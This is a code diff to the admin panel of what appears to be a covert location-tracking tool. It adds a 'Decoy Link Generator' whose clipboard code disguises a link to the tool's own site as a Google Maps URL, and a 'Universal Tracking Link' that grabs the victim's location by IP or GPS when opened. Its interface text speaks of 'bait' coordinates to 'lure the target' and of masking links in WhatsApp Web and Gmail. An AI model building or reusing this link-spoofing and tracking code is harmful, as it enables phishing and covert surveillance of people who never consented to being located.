@@ -65,8 +65,32 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
     setGeneratedLink(link);
   };
 
-  // NEW: Rich Text Copy (Spoofing)
-  const copyToClipboard = async () => {
+  // Generic Link Copy (No Coords)
+  const copyGenericLink = async () => {
+    const baseUrl = window.location.origin;
+    const fakeVisualUrl = "https://www.google.com/maps";
+
+    try {
+        const htmlContent = `<a href="${baseUrl}">${fakeVisualUrl}</a>`;
+        const blobHtml = new Blob([htmlContent], { type: "text/html" });
+        const blobText = new Blob([baseUrl], { type: "text/plain" });
+
+        const data = [new ClipboardItem({
+            ["text/html"]: blobHtml,
+            ["text/plain"]: blobText
+        })];
+
+        await navigator.clipboard.write(data);
+        alert('Universal Link Copied! \n\n[MASKING ACTIVE]\nVisual: ' + fakeVisualUrl + '\nTarget: Your System Root');
+    } catch (err) {
+        console.error("Rich copy failed", err);
+        navigator.clipboard.writeText(baseUrl);
+        alert('Link copied (Plain Text Mode). Browser did not support masking.');
+    }
+  };
+
+  // Specific Target Link Copy
+  const copyTargetLink = async () => {
     if (!generatedLink) return;
 
     // The Fake Visual URL (What the user sees in the text)
@@ -131,7 +155,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
         
         {/* TOOL: Link Generator */}
         <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
-            <h3 className="text-sm font-bold text-slate-800 uppercase tracking-wider mb-4 border-b pb-2 flex items-center justify-between">
+            <h3 className="text-sm font-bold text-slate-800 uppercase tracking-wider mb-6 border-b pb-2 flex items-center justify-between">
                 <span>
                     <i className="fa-solid fa-link mr-2 text-indigo-500"></i>
                     Decoy Link Generator
@@ -141,53 +165,79 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                     Auto-Masking Active
                 </span>
             </h3>
-            <div className="flex flex-col md:flex-row gap-4 items-end">
-                <div className="w-full md:w-1/4">
-                    <label className="text-xs text-slate-500 font-semibold mb-1 block">Target Latitude</label>
-                    <input 
-                        type="number" 
-                        step="any"
-                        placeholder="-6.2088" 
-                        className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 outline-none"
-                        value={targetLat}
-                        onChange={(e) => setTargetLat(e.target.value)}
-                    />
-                </div>
-                <div className="w-full md:w-1/4">
-                    <label className="text-xs text-slate-500 font-semibold mb-1 block">Target Longitude</label>
-                    <input 
-                        type="number" 
-                        step="any"
-                        placeholder="106.8456" 
-                        className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 outline-none"
-                        value={targetLng}
-                        onChange={(e) => setTargetLng(e.target.value)}
-                    />
-                </div>
-                <div className="w-full md:w-auto">
+
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+                {/* 1. Quick Share (No Coords) */}
+                <div className="bg-slate-50 p-4 rounded-lg border border-slate-200 flex flex-col justify-between">
+                    <div>
+                        <h4 className="font-bold text-slate-700 text-sm mb-1">Universal Tracking Link</h4>
+                        <p className="text-xs text-slate-500 mb-4">
+                            Creates a generic link. When opened, it finds the user's location via IP/GPS automatically.
+                        </p>
+                        <div className="bg-white px-3 py-2 rounded border border-dashed border-slate-300 mb-3">
+                             <p className="text-[10px] text-slate-400 font-bold uppercase">Mask Preview:</p>
+                             <span className="text-sm text-green-600 font-mono">https://www.google.com/maps</span>
+                        </div>
+                    </div>
                     <button 
-                        onClick={generateTargetLink}
-                        className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium px-4 py-2 rounded-lg text-sm transition-colors"
+                        onClick={copyGenericLink}
+                        className="w-full bg-slate-800 hover:bg-slate-900 text-white font-medium px-4 py-2.5 rounded-lg text-sm transition-colors flex items-center justify-center"
                     >
-                        Generate Link
+                        <i className="fa-solid fa-copy mr-2"></i> Copy Universal Link
                     </button>
                 </div>
-                {generatedLink && (
-                    <div className="flex-1 w-full bg-indigo-50 border border-indigo-100 rounded-lg px-3 py-2 flex items-center justify-between gap-3">
-                         <div className="overflow-hidden">
-                            <p className="text-[10px] text-slate-400 font-bold uppercase">Real Link:</p>
-                            <span className="text-xs text-indigo-700 truncate font-mono block">{generatedLink}</span>
-                            <p className="text-[10px] text-slate-400 font-bold uppercase mt-1">Masked as:</p>
-                            <span className="text-xs text-green-600 truncate font-mono block">https://maps.google.com/maps?q={targetLat},{targetLng}</span>
-                         </div>
-                        <button onClick={copyToClipboard} className="bg-white border border-indigo-200 text-indigo-600 hover:text-indigo-800 hover:bg-indigo-50 px-3 py-2 rounded shadow-sm text-xs font-bold whitespace-nowrap">
-                            <i className="fa-solid fa-copy mr-1"></i> Copy Decoy
-                        </button>
+
+                {/* 2. Specific Target (With Coords) */}
+                <div className="flex flex-col gap-3">
+                    <div>
+                        <h4 className="font-bold text-slate-700 text-sm mb-1">Specific Bait Location</h4>
+                        <p className="text-xs text-slate-500 mb-3">
+                            The map will open at these coordinates initially to lure the target.
+                        </p>
                     </div>
-                )}
+                    
+                    <div className="flex gap-2">
+                        <div className="w-1/2">
+                             <label className="text-[10px] text-slate-500 font-bold mb-1 block">LATITUDE</label>
+                             <input 
+                                type="number" step="any" placeholder="-6.2088" 
+                                className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 outline-none"
+                                value={targetLat} onChange={(e) => setTargetLat(e.target.value)}
+                            />
+                        </div>
+                        <div className="w-1/2">
+                             <label className="text-[10px] text-slate-500 font-bold mb-1 block">LONGITUDE</label>
+                             <input 
+                                type="number" step="any" placeholder="106.8456" 
+                                className="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 outline-none"
+                                value={targetLng} onChange={(e) => setTargetLng(e.target.value)}
+                            />
+                        </div>
+                    </div>
+                    
+                    <button 
+                        onClick={generateTargetLink}
+                        className="w-full bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 font-medium px-4 py-2 rounded-lg text-sm transition-colors"
+                    >
+                        Generate Coordinates Link
+                    </button>
+
+                    {generatedLink && (
+                        <div className="flex gap-2 animate-in fade-in slide-in-from-top-1">
+                             <div className="flex-1 bg-indigo-50 border border-indigo-100 rounded px-2 py-1.5 flex items-center">
+                                <span className="text-xs text-green-600 truncate font-mono">https://maps.google.com/maps?q=...</span>
+                             </div>
+                             <button onClick={copyTargetLink} className="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-xs font-bold shadow-sm">
+                                Copy
+                             </button>
+                        </div>
+                    )}
+                </div>
             </div>
-            <p className="text-xs text-slate-400 mt-2">
-                * When copied, the link will visually appear as <b>maps.google.com</b> but will direct to this system.
+            
+            <p className="text-xs text-slate-400 mt-4 text-center border-t border-slate-100 pt-3">
+                <i className="fa-solid fa-circle-info mr-1"></i> 
+                Both links utilize <b>HTML Injection</b> to mask the URL in rich-text environments (WhatsApp Web, Gmail, etc).
             </p>
         </div>
 
